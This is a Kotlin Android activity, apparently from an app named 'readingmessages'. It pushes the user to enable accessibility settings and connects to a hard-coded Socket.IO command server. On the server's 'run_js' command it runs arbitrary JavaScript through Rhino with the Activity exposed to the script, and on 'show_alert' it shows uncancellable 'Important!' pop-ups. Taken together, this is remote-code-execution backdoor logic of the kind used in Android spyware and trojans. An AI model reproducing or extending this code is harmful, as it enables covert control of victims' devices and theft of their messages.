package com.example.readingmessages

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Button
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.example.app.net.SocketManager
import org.json.JSONObject
import org.mozilla.javascript.Context
import org.mozilla.javascript.Scriptable

class MainActivity : AppCompatActivity() {
    private lateinit var socketManager: SocketManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnEnableAccessibility = findViewById<Button>(R.id.btnEnableAccessibility)
        btnEnableAccessibility.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }

        socketManager = SocketManager("http://10.100.102.50:8080", "web-test")
        socketManager.listener = object : SocketManager.Listener {
            override fun onConnected() {
                Log.d("TestDebug", "Connected to Socket.IO server")
            }

            override fun onDisconnected() {
                Log.d("TestDebug", "Disconnected from Socket.IO server")
            }

            override fun onError(t: Throwable) {
                Log.e("TestDebug", "Socket error: ${t.message}")
            }

            override fun onServerCommand(command: String, payload: JSONObject?) {
                Log.d("TestDebug", "Server command: $command with payload: $payload")
                when (command) {
                    "run_js" -> {
                        val jsCode = payload?.optString("code")
                        if (!jsCode.isNullOrEmpty()) {
                            runJsCode(jsCode)
                        }
                    }
                    "show_alert" -> {
                        val msg = payload?.optString("text") ?: "Alert from server"
                        runOnUiThread {
                            AlertDialog.Builder(this@MainActivity)
                                .setTitle("Important!")
                                .setMessage(msg)
                                .setCancelable(false)
                                .setPositiveButton("OK", null)
                                .show()
                        }
                    }

                    else -> {
                        Log.w("TestDebug", "Unknown server command: $command")
                    }
                }
            }
        }
        socketManager.connect()
    }

    private fun runJsCode(jsCode: String) {
        Log.d("TestDebug", "runJsCode received: $jsCode")
        val cx = Context.enter()
        cx.optimizationLevel = -1
        try {
            val scope: Scriptable = cx.initStandardObjects()
            scope.put("context", scope, this)
            cx.evaluateString(scope, jsCode, "JS", 1, null)
        } catch (e: Exception) {
            Log.e("TestDebug", "JS execution error: $e")
        } finally {
            Context.exit()
        }
    }
}
